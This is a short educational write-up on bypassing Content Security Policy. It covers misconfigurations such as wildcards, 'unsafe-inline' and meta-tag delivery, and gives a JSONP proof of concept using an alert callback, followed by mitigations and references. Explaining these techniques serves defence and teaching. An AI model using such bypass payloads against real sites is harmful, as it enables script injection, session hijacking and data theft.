Content Security Policy (CSP) is a browser feature used to prevent certain types of attacks like Cross-Site Scripting (XSS), clickjacking, and data injection. It works by restricting which sources of content (scripts, styles, images, etc.) are permitted to load and execute.

A **CSP Bypass** occurs when the policy is misconfigured, overly permissive, or when attackers find ways to circumvent it via clever payloads or fallback behavior.

---

## Common Bypass Techniques

### 1. Wildcard Domains

Permitting wide access like:

script-src *;

Allows JavaScript from any domain — effectively nullifying CSP.

### 2. `unsafe-inline` or `unsafe-eval`

Allowing inline scripts or `eval()` in a policy:

script-src 'self' 'unsafe-inline' 'unsafe-eval';


Negates most XSS protections.

### 3. JSONP or Open Redirects

Using trusted third-party scripts that return attacker-controlled JavaScript:

Example CSP:
`script-src 'self' https://api.trusted.com;`


Exploit via:
`https://api.trusted.com/jsonp?callback=alert(1)`


### 4. CSP via Meta Tags (not enforced early)

Defining CSP via `<meta http-equiv="Content-Security-Policy">` instead of HTTP headers can delay enforcement, allowing initial script execution.

---

## Proof of Concept (PoC)

### Scenario: CSP with JSONP trusted domain

**CSP header:**

Content-Security-Policy: script-src 'self' https://trusted.com/;

**Attacker payload:**

```html
<script src="https://trusted.com/jsonp?callback=alert"></script>
```
If trusted.com reflects callback as JavaScript, CSP is bypassed.

## Impact

- **XSS despite CSP**: Attackers can execute malicious JavaScript.
- **Data theft**: Sensitive information like tokens or credentials can be stolen.
- **Session hijacking**: Cookies or session data can be accessed.
- **Clickjacking and UI Redress**: If CSP does not include `frame-ancestors` restriction.

## Mitigation

- Avoid using wildcards (`*`) in `script-src`, `style-src`, or `connect-src`.
- Remove `unsafe-inline` and `unsafe-eval` wherever possible.
- Serve a strict CSP via HTTP headers, not just `<meta>` tags.
- Use Subresource Integrity (SRI) for third-party scripts.
- Define fallback directives (`default-src 'none'`) and add:

base-uri 'none';
object-src 'none';
frame-ancestors 'none';

- Test CSP using browser developer tools and security scanners.

## References

- OWASP CSP Bypass Cheatsheet: https://owasp.org/www-community/attacks/Content_Security_Policy_CSP_Bypass
- Mozilla Developer Network (MDN): https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
- PortSwigger: https://portswigger.net/research/bypassing-csp-using-polyglot-payloads









